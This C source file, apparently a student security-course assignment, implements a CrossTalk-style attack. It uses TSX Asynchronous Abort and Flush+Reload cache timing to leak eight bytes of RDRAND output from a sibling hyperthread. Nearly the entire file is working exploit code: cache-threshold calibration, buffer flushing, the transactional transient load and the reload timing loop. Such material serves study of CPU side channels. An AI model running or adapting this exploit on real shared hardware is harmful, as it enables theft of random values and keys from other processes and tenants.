#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <string.h>
#include <x86intrin.h>   
#include "asm.h"        

#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 100
#define ROUNDS 10
#define STRIDE 4096    
#define POSSIBLE_BYTES 256
#define BYTES_TO_LEAK 8               
#define RDRAND_OFFSET 32


static uint8_t *leak;
static uint8_t *reloadbuffer;                     
static uint64_t CACHE_THRESHOLD;



uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}



uint64_t get_cache_threshold(){

    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    //HITS
    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t =measure_access(test_line, 0);
        hits += delta_t;
    }

    //MISSES
    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t=  measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hitt_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hitt_avg) / 2;
 
    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {

    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();
    
    uint64_t delta_t = end - start;

    return delta_t;
}




int main(void) {

    CACHE_THRESHOLD = get_cache_threshold();

    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);

    usleep(1000);

    // so they can run on the twohyperthreads of the attacker’s physical core
    //child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
    pid_t pid = fork();

    // child CPID loop
    if (pid == 0) {
        
        while(1) {
            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet         
        }
        _exit(0);
    }

    size_t const mmap_prot = PROT_READ | PROT_WRITE;
    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB;

    unsigned char result[BYTES_TO_LEAK];
    leak = mmap(NULL, sizeof(uint64_t), mmap_prot, mmap_flags, -1, 0);
    reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);

    // ===================================================PARENT=======================================================

    while(1) {
        for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
            uint32_t all_hit_bytes[256] = {0};

            for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
                
                // Step 1: flush reload buffer
                for (int i = 0; i < POSSIBLE_BYTES; i++) {
                    clflush(&reloadbuffer[i * STRIDE]);
                }

                clflush(leak + secret_byte);
                sfence();
                clflush(reloadbuffer); // Necessary to cause TAA

                // Step 3: TAA
                if (_xbegin() == _XBEGIN_STARTED)
                {
                    size_t index = *(leak + secret_byte) * STRIDE; // This should use the data in the LFB transiently.
                    *(volatile char*)(reloadbuffer + index);

                    _xend();
                }

                // Step 4: Reload and measure access times
                for(int j=0; j<POSSIBLE_BYTES; j++){
                    uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                    if(reload_time < CACHE_THRESHOLD){
                        all_hit_bytes[j]++;
                    }
                }
            }

            // Analyze results to find the most likely byte value
            int max_index = 0;
            for(int i = 1; i < 256; i++) {
                if(all_hit_bytes[i] > all_hit_bytes[max_index]) {
                    max_index = i;
                }
            }

            result[secret_byte - RDRAND_OFFSET] = max_index;
        }

        printf("0x%02x%02x%02x%02x%02x%02x%02x%02x\n", result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7]);
    }

    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);
    puts("crosstalk done");
    return 0;
}

